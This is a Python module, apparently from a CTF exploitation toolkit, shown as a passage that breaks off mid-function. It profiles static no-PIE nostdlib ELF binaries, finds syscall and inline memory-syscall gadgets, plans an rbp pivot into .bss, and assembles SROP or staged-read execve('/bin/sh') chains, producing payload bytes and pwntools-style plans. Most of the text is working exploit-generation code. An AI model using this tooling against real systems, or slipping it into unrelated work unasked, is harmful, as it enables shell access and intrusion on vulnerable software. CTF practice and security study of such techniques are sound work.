"""Static-nostdlib SROP / execve autobuilder (B-052) -- a PLAN engine.

The residual that this item names is a *static no-PIE nostdlib* read-overflow binary (the csctf
"sigil" shape): there is no libc, so ret2libc / one_gadget do not apply, and the solve instead

  1. recognises a syscall-capable surface -- either a bare ``syscall`` gadget (for SROP) or an
     *inline memory-syscall gadget* ``mov rax,[rbp-X]; ... ; syscall`` whose syscall number and
     arguments are read from an rbp-relative scratch area, and
  2. pivots the saved frame pointer into a writable ``.bss`` page and re-reads a second stage there
     (the multi-stage read pivot), then
  3. assembles an ``execve("/bin/sh", 0, 0)`` chain -- an SROP sigreturn frame, or a staged-read
     layout that fills the inline gadget's rbp-relative slots.

This module binds those four pieces into one plan.  It is deliberately *plan-only*: it never maps,
assembles against, or executes the binary, and has no network surface.  It reads one ELF statically,
reuses the exact offline serializers already in the tree (``gadget_catalog`` for byte-exact gadget
addresses, ``userland_chains`` for the exact x86 sigcontext frame), and emits a reviewable plan plus a
paste-ready pwntools script.  Every address it reports is read from the ELF (a no-PIE binary needs no
leak) or is a caller-supplied value, never a guess.
"""
from __future__ import annotations

import argparse
import dataclasses
import json
import struct
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Iterable, Mapping, Sequence

try:  # flat import on the engine sys.path (solvers/toolkits is on it); package form under pytest
    from gadget_catalog import GadgetCatalog, catalog_elf, ELFParseError
    import userland_chains as _chains
    from contract import BuildError
except ImportError:  # pragma: no cover - exercised only off the engine sys.path
    from solvers.toolkits.gadget_catalog import GadgetCatalog, catalog_elf, ELFParseError
    from solvers.toolkits import userland_chains as _chains
    from solvers.toolkits.contract import BuildError


MAX_BYTES = 64 * 1024 * 1024
DEFAULT_WINDOW = 64        # bytes scanned backwards from a `syscall` for rbp-relative loads
DEFAULT_MAX_LOADS = 8      # inline-gadget loads to collect before giving up (bounded)
MAX_SYSCALL_GADGETS = 4096
_PAGE = 0x1000

# e_machine -> arch name (matches gadget_catalog / pwn_autobuild).  amd64 / i386 are the only x86
# targets with an exact sigcontext serializer and a register-load vocabulary here; everything else is
# recognised only so the plan can decline by name rather than emit a wrong chain.
_MACHINES = {62: "amd64", 3: "i386", 183: "aarch64", 40: "arm", 8: "mips", 10: "mips", 243: "riscv"}
_SUPPORTED = ("amd64", "i386")

# Program-header constants (ELF gABI); no pyelftools needed for the header walk.
_PT_LOAD, _PT_INTERP, _PT_DYNAMIC = 1, 3, 2
_PF_X, _PF_W, _PF_R = 0x1, 0x2, 0x4

# Imported names that mark a read-style overflow primitive or a linked libc (so "nostdlib" is only
# claimed when none is present).  Kept here so the module is self-contained.
_READ_OVERFLOW_FUNCS = ("read", "fread", "gets", "recv", "recvfrom", "fgets", "scanf", "__isoc99_scanf")
_LIBC_MARKERS = ("__libc_start_main", "__libc_csu_init", "system", "__libc_csu_fini", "setvbuf")


class SropBuildError(ValueError):
    """The input is not a static ELF this autobuilder can plan against (named, never silent)."""


# --------------------------------------------------------------------------- ELF program-header walk

@dataclass(frozen=True)
class Segment:
    """One PT_LOAD-ish program header, enough for the writable / executable classification."""

    ptype: int
    flags: int
    offset: int
    vaddr: int
    filesz: int
    memsz: int

    @property
    def executable(self) -> bool:
        return self.ptype == _PT_LOAD and bool(self.flags & _PF_X)

    @property
    def writable(self) -> bool:
        return self.ptype == _PT_LOAD and bool(self.flags & _PF_W)

    @property
    def bss_gap(self) -> int:
        """Bytes of zero-initialised (uninitialised, file-absent) space at the segment's tail."""
        return max(0, self.memsz - self.filesz)

    def as_dict(self) -> dict:
        return {
            "ptype": self.ptype, "flags": self.flags, "offset": self.offset,
            "vaddr": self.vaddr, "filesz": self.filesz, "memsz": self.memsz,
            "executable": self.executable, "writable": self.writable, "bss_gap": self.bss_gap,
        }


def _read_source(source: bytes | bytearray | memoryview | str | Path, *, max_bytes: int) -> bytes:
    if isinstance(source, (bytes, bytearray, memoryview)):
        data = bytes(source)
    else:
        path = Path(source)
        try:
            size = path.stat().st_size
        except OSError as exc:
            raise SropBuildError(f"cannot stat ELF source: {exc}") from exc
        if size > max_bytes:
            raise SropBuildError(f"{path.name} is {size} bytes, over the {max_bytes} cap")
        data = path.read_bytes()
    if len(data) > max_bytes:
        raise SropBuildError(f"ELF exceeds {max_bytes} bytes")
    return data


def _ident(data: bytes) -> dict:
    """ELF identity + program-header table location (stdlib struct; no pyelftools)."""
    if len(data) < 20 or data[:4] != b"\x7fELF":
        raise SropBuildError("not an ELF (bad magic)")
    bits = {1: 32, 2: 64}.get(data[4])
    if bits is None:
        raise SropBuildError("not an ELF (bad EI_CLASS)")
    endian = {1: "little", 2: "big"}.get(data[5])
    if endian is None:
        raise SropBuildError("not an ELF (bad EI_DATA)")
    ec = "<" if endian == "little" else ">"
    etype, machine = struct.unpack_from(ec + "HH", data, 16)
    if bits == 64:
        if len(data) < 64:
            raise SropBuildError("truncated ELF64 header")
        entry, phoff = struct.unpack_from(ec + "QQ", data, 24)
        phentsize, phnum = struct.unpack_from(ec + "HH", data, 54)
    else:
        if len(data) < 52:
            raise SropBuildError("truncated ELF32 header")
        entry = struct.unpack_from(ec + "I", data, 24)[0]
        phoff = struct.unpack_from(ec + "I", data, 28)[0]
        phentsize, phnum = struct.unpack_from(ec + "HH", data, 42)
    return {
        "bits": bits, "endian": endian, "ec": ec, "etype": etype, "machine": machine,
        "entry": entry, "phoff": phoff, "phentsize": phentsize, "phnum": phnum,
    }


def _segments(data: bytes, ident: dict) -> tuple[Segment, ...]:
    bits, ec = ident["bits"], ident["ec"]
    phoff, entsize, count = ident["phoff"], ident["phentsize"], ident["phnum"]
    expected = 56 if bits == 64 else 32
    if not phoff or not count or entsize < expected or count > 65535:
        return ()
    out: list[Segment] = []
    for i in range(count):
        base = phoff + i * entsize
        if base + expected > len(data):
            break
        if bits == 64:
            ptype, flags, offset, vaddr, _p, filesz, memsz, _a = struct.unpack_from(
                ec + "IIQQQQQQ", data, base)
        else:
            ptype, offset, vaddr, _p, filesz, memsz, flags, _a = struct.unpack_from(
                ec + "IIIIIIII", data, base)
        out.append(Segment(ptype, flags, offset, vaddr, filesz, memsz))
    return tuple(out)


# --------------------------------------------------------------------------- symbol facts (optional)

def _symbol_facts(data: bytes) -> tuple[bool, tuple[str, ...], tuple[str, ...]]:
    """(has_symbols, imported-undefined names, all defined/declared names) via pyelftools when present.

    A nostdlib / overflow-surface judgement that *needs* symbols says so (a named degradation, never a
    silent one) when pyelftools is absent.
    """
    try:
        from elftools.elf.elffile import ELFFile
        from elftools.elf.sections import SymbolTableSection
    except Exception:  # noqa: BLE001 - pyelftools absent
        return False, (), ()
    try:
        import io
        elf = ELFFile(io.BytesIO(data))
    except Exception:  # noqa: BLE001
        return False, (), ()
    imports: set[str] = set()
    names: set[str] = set()
    try:
        for sec in elf.iter_sections():
            if not isinstance(sec, SymbolTableSection):
                continue
            for sym in sec.iter_symbols():
                name = sym.name or ""
                if not name:
                    continue
                names.add(name)
                if sym["st_shndx"] == "SHN_UNDEF":
                    imports.add(name)
    except Exception:  # noqa: BLE001 - a truncated table costs its own facts, not the header
        pass
    return True, tuple(sorted(imports)), tuple(sorted(names))


@dataclass(frozen=True)
class StaticElfProfile:
    """The static recon this engine routes on: is this the static no-PIE nostdlib regime?"""

    arch: str
    bits: int
    endian: str
    etype: int
    entry: int
    static: bool          # no PT_INTERP: not dynamically linked against an interpreter
    no_pie: bool          # ET_EXEC: fixed load address, no leak needed
    nostdlib: bool        # static and no libc markers / no dynamic imports
    has_symbols: bool
    segments: tuple[Segment, ...]
    imports: tuple[str, ...]
    overflow_surface: tuple[str, ...]
    notes: tuple[str, ...] = ()

    @property
    def executable_segments(self) -> tuple[Segment, ...]:
        return tuple(s for s in self.segments if s.executable)

    @property
    def writable_segments(self) -> tuple[Segment, ...]:
        return tuple(s for s in self.segments if s.writable)

    @property
    def supported(self) -> bool:
        return self.arch in _SUPPORTED

    @property
    def applicable(self) -> bool:
        """This engine plans only for a static, no-PIE, x86 target."""
        return self.static and self.no_pie and self.supported

    def bss_region(self) -> Segment | None:
        """The writable PT_LOAD with the largest zero-init gap -- the natural scratch page (.bss).

        Falls back to the writable segment with the most memory when none has a bss gap, so a plan
        still has a writable landing area to name.  Returns None when nothing is writable.
        """
        writable = self.writable_segments
        if not writable:
            return None
        with_gap = [s for s in writable if s.bss_gap > 0]
        pool = with_gap or list(writable)
        return max(pool, key=lambda s: (s.bss_gap, s.memsz, s.vaddr))

    def as_dict(self) -> dict:
        bss = self.bss_region()
        return {
            "arch": self.arch, "bits": self.bits, "endian": self.endian, "etype": self.etype,
            "entry": self.entry, "static": self.static, "no_pie": self.no_pie,
            "nostdlib": self.nostdlib, "has_symbols": self.has_symbols,
            "applicable": self.applicable,
            "segments": [s.as_dict() for s in self.segments],
            "writable_segments": [s.as_dict() for s in self.writable_segments],
            "bss_region": bss.as_dict() if bss else None,
            "imports": list(self.imports), "overflow_surface": list(self.overflow_surface),
            "notes": list(self.notes),
        }


def profile_static_elf(source: bytes | str | Path, *, max_bytes: int = MAX_BYTES) -> StaticElfProfile:
    """Statically classify one ELF: static? no-PIE? nostdlib? and locate its writable scratch region.

    Raises ``SropBuildError`` on a non-ELF or an oversize file -- never a silent pass.
    """
    data = _read_source(source, max_bytes=max_bytes)
    ident = _ident(data)
    arch = _MACHINES.get(ident["machine"], f"em_{ident['machine']}")
    segments = _segments(data, ident)
    seg_types = {s.ptype for s in segments}
    static = _PT_INTERP not in seg_types
    no_pie = ident["etype"] == 2  # ET_EXEC
    has_symbols, imports, names = _symbol_facts(data)
    notes: list[str] = []
    # nostdlib: static, with no libc start markers and no imported libc functions.  Without pyelftools
    # we cannot see symbols, so "static with no dynamic segment" is the strongest claim we make and we
    # say the symbol read was unavailable (rule 6: a named degradation).
    has_dynamic = _PT_DYNAMIC in seg_types
    if has_symbols:
        libc_linked = any(m in names for m in _LIBC_MARKERS) or bool(imports)
        nostdlib = static and not libc_linked
    else:
        nostdlib = static and not has_dynamic
        notes.append("pyelftools unavailable: nostdlib inferred from the absence of a PT_DYNAMIC "
                     "segment only; install py:elftools to confirm from the symbol table")
    overflow = tuple(n for n in imports if n in _READ_OVERFLOW_FUNCS)
    if static and not no_pie and ident["etype"] == 3:
        notes.append("ET_DYN + no PT_INTERP: a static-PIE binary; addresses still need a leak, so the "
                     "no-PIE concreteness this engine relies on does not hold")
    if not static:
        notes.append("PT_INTERP present: dynamically linked (not nostdlib); ret2libc / one_gadget "
                     "(pwn_autobuild, one_gadget) are the usual paths, not an SROP/syscall-execve chain")
    return StaticElfProfile(
        arch=arch, bits=ident["bits"], endian=ident["endian"], etype=ident["etype"],
        entry=ident["entry"], static=static, no_pie=no_pie, nostdlib=nostdlib,
        has_symbols=has_symbols, segments=segments, imports=imports,
        overflow_surface=overflow, notes=tuple(notes),
    )


# --------------------------------------------------------------- inline memory-syscall gadget scanner

# ModRM reg-field -> register, for a 64-bit `mov r64, [rbp+disp]` load (opcode 0x8B, REX.W).  rm=101
# (rbp-relative) with mod=01 (disp8) or mod=10 (disp32).  REX.R extends the reg field to r8..r15.
_REG64 = {0: "rax", 1: "rcx", 2: "rdx", 3: "rbx", 4: "rsp", 5: "rbp", 6: "rsi", 7: "rdi",
          8: "r8", 9: "r9", 10: "r10", 11: "r11", 12: "r12", 13: "r13", 14: "r14", 15: "r15"}
_REG32 = {0: "eax", 1: "ecx", 2: "edx", 3: "ebx", 4: "esp", 5: "ebp", 6: "esi", 7: "edi"}


def _decode_rbp_load(data: bytes, end: int) -> tuple[int, str, int] | None:
    """Decode a single ``mov reg, [rbp+disp]`` load that *ends* exactly at byte ``end``.

    Returns ``(start, register, displacement)`` or None.  Only rbp-relative loads are recognised,
    because rbp is exactly the register the frame-pointer pivot controls, so these displacements say
    where each syscall operand must be staged.  Forms, longest first so the decode is unambiguous:

      REX.W 8B /r [rbp+disp32]   7 bytes   REX.W 8B /r [rbp+disp8]   4 bytes
            8B /r [rbp+disp32]   6 bytes         8B /r [rbp+disp8]   3 bytes

    A REX with REX.B set would make rm=101 mean r13, not rbp, so it is rejected.  REX.R extends the
    destination to r8..r15.
    """
    for rex_len, disp_len in ((1, 4), (1, 1), (0, 4), (0, 1)):
        total = rex_len + 2 + disp_len
        start = end - total
        if start < 0:
            continue
        reg_ext = 0
        if rex_len:
            rex = data[start]
            if rex & 0xF8 != 0x48:          # not a REX.W (0x48..0x4F)
                continue
            if rex & 0x01:                  # REX.B set -> base is r13, not rbp
                continue
            reg_ext = 8 if (rex & 0x04) else 0
            table = _REG64
        else:
            # A no-REX 32-bit `8B /r` form must not be matched when the byte just before it is a REX
            # prefix: that 0x8B is the opcode of a REX-prefixed 64-bit instruction, not a standalone
            # load.  Without this, a rejected `49 8B 45 e8` (mov rax,[r13-disp], REX.B set) would be
            # re-read here as `mov eax,[rbp-disp]` and the r13 base silently promoted to rbp.  A
            # conservative false-negative (skipping a genuine 32-bit load after some instruction that
            # happens to end in 0x40..0x4F) is safe: the operand is just not staged.
            if start > 0 and 0x40 <= data[start - 1] <= 0x4F:
                continue
            table = _REG32
        if data[start + rex_len] != 0x8B:   # mov r, r/m
            continue
        modrm = data[start + rex_len + 1]
        mod, reg, rm = modrm >> 6, (modrm >> 3) & 7, modrm & 7
        if rm != 5:                         # rm=101 -> rbp(+disp) (mod!=00)
            continue
        if mod == 1 and disp_len != 1:
            continue
        if mod == 2 and disp_len != 4:
            continue
        if mod not in (1, 2):
            continue
        reg_name = table.get(reg + reg_ext)
        if reg_name is None:
            continue
        raw_disp = int.from_bytes(data[start + rex_len + 2:end], "little", signed=True)
        return start, reg_name, raw_disp
    return None


@dataclass(frozen=True)
class SyscallGadget:
    """A syscall site, with any rbp-relative operand loads that immediately precede it."""

    address: int                       # vaddr of the first byte of the gadget
    syscall_address: int               # vaddr of the `syscall` (0F 05) itself
    file_offset: int
    kind: str                          # "syscall" | "syscall-from-memory"
    loads: tuple[tuple[str, int], ...] = ()   # (register, rbp displacement), in program order
    has_ret: bool = False              # a `ret` (0xC3) follows the syscall

    @property
    def load_map(self) -> dict[str, int]:
        """register -> rbp displacement, the *last* load winning if a register is loaded twice."""
        out: dict[str, int] = {}
        for reg, disp in self.loads:
            out[reg] = disp
        return out

    @property
    def rax_displacement(self) -> int | None:
        m = self.load_map
        return m.get("rax", m.get("eax"))

    @property
    def sets_rax_from_memory(self) -> bool:
        return self.rax_displacement is not None

    def as_dict(self) -> dict:
        return {
            "address": self.address, "syscall_address": self.syscall_address,
            "file_offset": self.file_offset, "kind": self.kind,
            "loads": [[r, d] for r, d in self.loads], "has_ret": self.has_ret,
            "load_map": self.load_map, "rax_displacement": self.rax_displacement,
            "sets_rax_from_memory": self.sets_rax_from_memory,
        }


def find_syscall_gadgets(
    source: bytes | str | Path,
    *,
    window: int = DEFAULT_WINDOW,
    max_loads: int = DEFAULT_MAX_LOADS,
    max_gadgets: int = MAX_SYSCALL_GADGETS,
    max_bytes: int = MAX_BYTES,
) -> tuple[SyscallGadget, ...]:
    """Find x86-64 ``syscall`` sites and the rbp-relative operand loads that feed them.

    For each ``0F 05`` in an executable region the scanner walks backwards over consecutive
    ``mov reg,[rbp+disp]`` loads (bounded by ``window`` bytes and ``max_loads`` loads).  When one of
    those loads targets rax the site is an *inline memory-syscall gadget* -- the syscall number (and
    arguments) come from an rbp-relative scratch area, which is precisely what the frame-pointer pivot
    controls.  Pure byte inspection; nothing is decoded speculatively past the whitelist and nothing
    is executed.
    """
    if window < 2 or window > 4096:
        raise SropBuildError("window must be in 2..4096 bytes")
    if max_loads < 0 or max_loads > 64:
        raise SropBuildError("max_loads must be in 0..64")
    data = _read_source(source, max_bytes=max_bytes)
    ident = _ident(data)
    arch = _MACHINES.get(ident["machine"], f"em_{ident['machine']}")
    if arch != "amd64":
        # The inline-syscall decoder is x86-64 only; i386's `int 0x80` path is template ROP already
        # covered by pwn_autobuild, and the RISC syscalls have no rbp-relative load idiom here.
        return ()
    segments = _segments(data, ident)
    out: list[SyscallGadget] = []
    seen: set[int] = set()
    for seg in segments:
        if not seg.executable:
            continue
        end = min(seg.offset + seg.filesz, len(data))
        region = data[seg.offset:end]
        search = 0
        while True:
            hit = region.find(b"\x0f\x05", search)
            if hit < 0:
                break
            search = hit + 1
            syscall_vaddr = seg.vaddr + hit
            if syscall_vaddr in seen:
                continue
            seen.add(syscall_vaddr)
            # Walk backwards over whitelisted rbp-relative loads.
            loads: list[tuple[str, int]] = []
            pos = hit
            floor = max(0, hit - window)
            while len(loads) < max_loads and pos > floor:
                decoded = _decode_rbp_load(region, pos)
                if decoded is None:
                    break
                start, reg, disp = decoded
                if start < floor:
                    break
                loads.append((reg, disp))
                pos = start
            loads.reverse()  # program order
            has_ret = (hit + 2) < len(region) and region[hit + 2] == 0xC3
            start_vaddr = seg.vaddr + (pos if loads else hit)
            kind = "syscall-from-memory" if any(r in ("rax", "eax") for r, _ in loads) else "syscall"
            out.append(SyscallGadget(
                address=start_vaddr, syscall_address=syscall_vaddr,
                file_offset=seg.offset + (pos if loads else hit), kind=kind,
                loads=tuple(loads), has_ret=has_ret,
            ))
            if len(out) > max_gadgets:
                raise SropBuildError(f"syscall gadget count exceeds cap {max_gadgets}")
    out.sort(key=lambda g: g.address)
    return tuple(out)


# --------------------------------------------------------------------------- the plan model

@dataclass(frozen=True)
class PivotStage:
    index: int
    action: str
    note: str

    def as_dict(self) -> dict:
        return dataclasses.asdict(self)


@dataclass(frozen=True)
class ReadPivotPlan:
    """The multi-stage frame-pointer pivot into a writable .bss page."""

    bss_base: int | None
    pivot_target: int | None
    primitive: str                 # "leave;ret" | "pop rbp;ret" | "none"
    stages: tuple[PivotStage, ...]
    note: str

    def as_dict(self) -> dict:
        return {
            "bss_base": self.bss_base, "pivot_target": self.pivot_target,
            "primitive": self.primitive, "stages": [s.as_dict() for s in self.stages],
            "note": self.note,
        }


@dataclass(frozen=True)
class SropAutobuildPlan:
    """One static-nostdlib execve plan: profile + gadgets + pivot + the assembled chain."""

    strategy: str                  # "srop" | "staged-read-syscall" | "none"
    arch: str
    bits: int
    confidence: str                # concrete | needs-offset | needs-stage-addr | needs-gadget | none
    profile: Mapping[str, object]
    syscall_gadgets: tuple[Mapping[str, object], ...]
    read_pivot: Mapping[str, object] | None
    chain: Mapping[str, object]
    notes: tuple[str, ...]
    payload: bytes | None = None
    alternatives: tuple[str, ...] = ()

    def as_dict(self) -> dict:
        return {
            "strategy": self.strategy, "arch": self.arch, "bits": self.bits,
            "confidence": self.confidence, "profile": dict(self.profile),
            "syscall_gadgets": [dict(g) for g in self.syscall_gadgets],
            "read_pivot": dict(self.read_pivot) if self.read_pivot is not None else None,
            "chain": dict(self.chain), "notes": list(self.notes),
            "alternatives": list(self.alternatives),
            "payload_hex": self.payload.hex() if self.payload is not None else None,
            "payload_len": len(self.payload) if self.payload is not None else None,
        }


_CONF_RANK = {"concrete": 0, "needs-offset": 1, "needs-stage-addr": 2, "needs-gadget": 3, "none": 4}


def _scratch_addresses(bss: Segment | None, *, span_below: int) -> tuple[int | None, int | None, int | None]:
    """From a writable segment, derive concrete (command, pivot, stack) scratch addresses.

    A no-PIE binary has fixed load addresses, so these are real addresses, not guesses.  ``command``
    (the "/bin/sh" string) sits at the page-aligned base of the .bss; ``pivot`` sits far enough above
    it that the inline gadget's ``[rbp-disp]`` loads (which read *below* rbp) land inside the writable
    area; ``stack`` is a second scratch for the SROP frame's rsp.  Returns (None, None, None) when no
    writable region exists.
    """
    if bss is None:
        return None, None, None
    base = bss.vaddr + bss.filesz
    base = (base + 0xF) & ~0xF
    command = base + 0x10
    pivot = ((command + max(span_below, 0) + 0x40 + 0xF) & ~0xF)
    stack = pivot + 0x200
    return command, pivot, stack


def _srop_chain(
    profile: StaticElfProfile,
    catalog: GadgetCatalog | None,
    syscall_addr: int | None,
    *,
    command_address: int | None,
    stack_address: int | None,
    overflow_offset: int | None,
    command: bytes,
) -> tuple[dict, str, bytes | None, list[str]]:
    """Assemble the SROP execve chain: `pop rax=15`, `syscall` triggers sigreturn, the frame runs
    execve(command, 0, 0).  Reuses ``userland_chains.build_srop_execve`` for the exact sigcontext."""
    arch = profile.arch
    notes: list[str] = []
    pop_rax = None
    if catalog is not None:
        g = catalog.first("pop rax ; ret") if arch == "amd64" else catalog.first("pop eax ; ret")
        pop_rax = g.address if g else None
    chain: dict[str, object] = {
        "strategy": "srop",
        "accumulator_gadget": pop_rax,
        "sigreturn_number": 15 if arch == "amd64" else 119,
        "syscall_gadget": syscall_addr,
        "command_address": command_address,
        "stack_address": stack_address,
        "overflow_offset": overflow_offset,
        "frame": {"rax": 59 if arch == "amd64" else 11, "arg0": "command_address",
                  "arg1": 0, "arg2": 0, "rip": "syscall_gadget", "rsp": "stack_address"},
        "command_bytes": command.hex(),
    }
    missing = []
    if syscall_addr is None:
        missing.append("a `syscall` gadget (0F 05)")
    if pop_rax is None:
        missing.append("a `pop rax ; ret` to set rax=15 (sigreturn)")
    if missing:
        notes.append("SROP needs " + " and ".join(missing) + "; none found -- SROP declined")
        return chain, "needs-gadget", None, notes
    if command_address is None or stack_address is None:
        notes.append("no writable scratch located for the /bin/sh string and SROP rsp; supply "
                     "--opt binsh=0xADDR and --opt stack=0xADDR in a writable (.bss) page")
        return chain, "needs-stage-addr", None, notes
    if overflow_offset is None:
        notes.append("buffer offset to the saved return address unknown; supply --opt "
                     "buffer_offset=N (the read() length vs the buffer size, from the decompile)")
        return chain, "needs-offset", None, notes
    try:
        build = _chains.build_srop_execve(
            syscall_gadget=syscall_addr, pop_accumulator=pop_rax,
            command_address=command_address, stack_address=stack_address,
            overflow_offset=overflow_offset, architecture=arch,
        )
    except BuildError as exc:  # pragma: no cover - guarded by the checks above
        notes.append(f"SROP frame rejected: {exc}")
        return chain, "needs-stage-addr", None, notes
    chain["payload_len"] = len(build.payload)
    chain["placements"] = dict(build.placements)
    notes.append("stage the /bin/sh string into the command address first (a second read into .bss), "
                 "then send this trigger+frame as the overflow payload")
    return chain, "concrete", build.payload, notes


def _staged_syscall_chain(
    profile: StaticElfProfile,
    gadget: SyscallGadget | None,
    pivot: ReadPivotPlan | None,
    *,
    command: bytes,
) -> tuple[dict, str, list[str]]:
    """Assemble the staged-read inline-syscall chain: pivot rbp into .bss, stage execve's register
    values at the gadget's rbp-relative load offsets plus the /bin/sh string, enter the gadget."""
    notes: list[str] = []
    if gadget is None or not gadget.sets_rax_from_memory:
        notes.append("no inline memory-syscall gadget (`mov rax,[rbp-X]; ... ; syscall`) found -- "
                     "the staged-read path needs one; use the SROP path instead")
        return {"strategy": "staged-read-syscall"}, "needs-gadget", notes
    load_map = gadget.load_map
    pivot_target = pivot.pivot_target if pivot else None
    # execve(path, 0, 0): rax=59, rdi=&"/bin/sh", rsi=0, rdx=0.  The gadget reads each operand from
    # [rbp+disp], so stage each value at pivot_target+disp.
    want = {"rax": 59, "rsi": 0, "rdx": 0}  # rdi handled as the command pointer
    layout: list[dict] = []
    command_slot = None
    for reg in ("rax", "rdi", "rsi", "rdx"):
        disp = load_map.get(reg)
        if disp is None and reg in ("eax",):
            disp = load_map.get("eax")
        if disp is None:
            continue
        addr = (pivot_target + disp) if pivot_target is not None else None
        if reg == "rdi":
            command_slot = addr
            layout.append({"register": reg, "rbp_disp": disp, "stage_addr": addr,
                           "value": "command_address (&\"/bin/sh\")"})
        else:
            layout.append({"register": reg, "rbp_disp": disp, "stage_addr": addr,
                           "value": want.get(reg, 0)})
    missing_regs = [r for r in ("rax", "rdi") if r not in load_map]
    chain: dict[str, object] = {
        "strategy": "staged-read-syscall",
        "gadget_address": gadget.address,
        "syscall_address": gadget.syscall_address,
        "rax_displacement": gadget.rax_displacement,
        "pivot_target": pivot_target,
        "register_layout": layout,
        "command_bytes": command.hex(),
        "command_stage_addr": command_slot,
    }
    if missing_regs:
        notes.append("inline gadget does not load " + "/".join(missing_regs)
                     + " from memory; those operands must be set another way (pop gadget or a second "
                       "gadget) before entering it")
    if pivot is None or pivot.primitive == "none":
        notes.append("no frame-pointer pivot gadget (`leave ; ret` or `pop rbp ; ret`) found to aim "
                     "rbp at the .bss scratch; the pivot is the missing half of the staged read")
        return chain, "needs-gadget", notes
    if pivot_target is None:
        notes.append("no writable .bss scratch located to pivot rbp into; supply --opt pivot=0xADDR")
        return chain, "needs-stage-addr", notes
    notes.append("two-stage read: stage 1 overflows, sets saved rbp = pivot and returns into the "
                 "function's read (or a `lea; read` gadget) to land stage 2 in .bss; stage 2 lays the "
                 "register values above, then returns into the inline syscall gadget; a short "
                 "inter-stage delay keeps the two reads from coalescing")
    return chain, "needs-offset", notes


def _build_read_pivot(profile: StaticElfProfile, catalog: GadgetCatalog | None,
                      gadget: SyscallGadget | None, *, pivot_override: int | None) -> ReadPivotPlan:
    bss = profile.bss_region()
    bss_base = (bss.vaddr + bss.filesz) if bss else None
    span_below = 0
    if gadget is not None and gadget.loads:
        span_below = max((-d for _, d in gadget.loads if d < 0), default=0)
    _cmd, pivot_default, _stack = _scratch_addresses(bss, span_below=span_below)
    pivot_target = pivot_override if pivot_override is not None else pivot_default
    primitive = "none"
    if catalog is not None:
        if catalog.first("leave ; ret"):
            primitive = "leave;ret"
        elif catalog.first("pop rbp ; ret"):
            primitive = "pop rbp;ret"
    stages = (
        PivotStage(1, "overflow -> set saved rbp = pivot, return into read/`leave;ret`",
                   "the saved frame pointer is overwritten with the .bss scratch address so the next "
                   "`leave` loads rsp=rbp and the stage-2 read lands in .bss"),
        PivotStage(2, "stage-2 read -> lay register values + /bin/sh, enter the syscall gadget",
                   "with rbp now in .bss the inline gadget's [rbp-disp] loads read the staged execve "
                   "operands"),
    )
    note = ("rbp pivot into .bss via " + primitive) if primitive != "none" else (
        "no rbp pivot gadget found")
    return ReadPivotPlan(bss_base=bss_base, pivot_target=pivot_target, primitive=primitive,
                         stages=stages, note=note)


def build_plan(
    source: bytes | str | Path,
    *,
    strategy: str | None = None,
    overflow_offset: int | None = None,
    binsh_addr: int | None = None,
    pivot_addr: int | None = None,
    stack_addr: int | None = None,
    command: bytes = b"/bin/sh\x00",
    window: int = DEFAULT_WINDOW,
    decompile_hints: Sequence[str] = (),
    max_bytes: int = MAX_BYTES,
) -> SropAutobuildPlan:
    """Bind detection, gadget scan, read pivot and execve assembly into one static-nostdlib plan.

    Nothing here runs the binary.  ``strategy`` forces "srop" or "staged-read-syscall"; otherwise the
    builder prefers SROP when a `syscall`+`pop rax` surface exists, else the inline-gadget staged read.
    ``decompile_hints`` are lines carried from B-011's decompile output (e.g. a recognised ``read()``
    overflow) used only to annotate the plan -- never to re-run a decompiler.
    """
    if not isinstance(command, (bytes, bytearray)) or not command:
        raise SropBuildError("command must be non-empty bytes")
    if strategy is not None and strategy not in ("srop", "staged-read-syscall"):
        raise SropBuildError("strategy must be 'srop' or 'staged-read-syscall'")
    command = bytes(command)
    profile = profile_static_elf(source, max_bytes=max_bytes)
    notes: list[str] = list(profile.notes)
    if not profile.supported:
        notes.append(f"architecture {profile.arch!r} has no x86 syscall/SROP assembler here "
                     "(amd64/i386 only)")
        return SropAutobuildPlan("none", profile.arch, profile.bits, "none", profile.as_dict(),
                                 (), None, {"strategy": "none"}, tuple(notes))
    if not profile.applicable:
        why = ("dynamically linked (PT_INTERP present)" if not profile.static
               else "position-independent (ET_DYN); this engine relies on fixed no-PIE addresses")
        notes.append(f"not a static no-PIE target: {why}; declining -- this engine plans only the "
                     "static-nostdlib SROP/syscall regime")
        return SropAutobuildPlan("none", profile.arch, profile.bits, "none", profile.as_dict(),
                                 (), None, {"strategy": "none"}, tuple(notes))
    if not profile.nostdlib:
        notes.append("static but libc appears linked (not nostdlib): ret2libc / one_gadget via "
                     "pwn_autobuild/one_gadget may be simpler; an SROP/syscall-execve chain still "
                     "works and is planned below")

    try:
        catalog: GadgetCatalog | None = catalog_elf(source if isinstance(source, (str, Path)) else
                                                    _read_source(source, max_bytes=max_bytes))
    except ELFParseError as exc:
        catalog = None
        notes.append(f"gadget catalog unavailable: {exc}")

    syscall_gadgets = find_syscall_gadgets(source, window=window, max_bytes=max_bytes)
    inline = next((g for g in syscall_gadgets if g.sets_rax_from_memory), None)
    # a plain syscall address for SROP: `syscall`/`syscall ; ret` on amd64, `int 0x80` on i386.
    plain_syscall = None
    if catalog is not None:
        if profile.arch == "i386":
            g = catalog.first("int 0x80 ; ret") or catalog.first("int 0x80")
        else:
            g = catalog.first("syscall ; ret") or catalog.first("syscall")
        plain_syscall = g.address if g else None
    if plain_syscall is None and profile.arch == "amd64" and syscall_gadgets:
        plain_syscall = syscall_gadgets[0].syscall_address

    for hint in decompile_hints:
        notes.append(f"decompile (B-011): {hint}")

    bss = profile.bss_region()
    span_below = max((-d for _, d in inline.loads if d < 0), default=0) if inline else 0
    cmd_default, pivot_default, stack_default = _scratch_addresses(bss, span_below=span_below)
    command_address = binsh_addr if binsh_addr is not None else cmd_default
    stack_address = stack_addr if stack_addr is not None else stack_default

    pivot_plan = _build_read_pivot(profile, catalog, inline, pivot_override=pivot_addr)

    srop_chain, srop_conf, srop_payload, srop_notes = _srop_chain(
        profile, catalog, plain_syscall, command_address=command_address,
        stack_address=stack_address, overflow_offset=overflow_offset, command=command)
    staged_chain, staged_conf, staged_notes = _staged_syscall_chain(
        profile, inline, pivot_plan, command=command)

    srop_available = srop_conf != "needs-gadget"
    staged_available = staged_conf != "needs-gadget"

    if strategy == "srop":
        chosen = "srop"
    elif strategy == "staged-read-syscall":
        chosen = "staged-read-syscall"
    elif srop_available:
        chosen = "srop"
    elif staged_available:
        chosen = "staged-read-syscall"
    else:
        chosen = "none"

    alternatives: list[str] = []
    if chosen != "srop" and srop_available:
        alternatives.append("srop")
    if chosen != "staged-read-syscall" and staged_available:
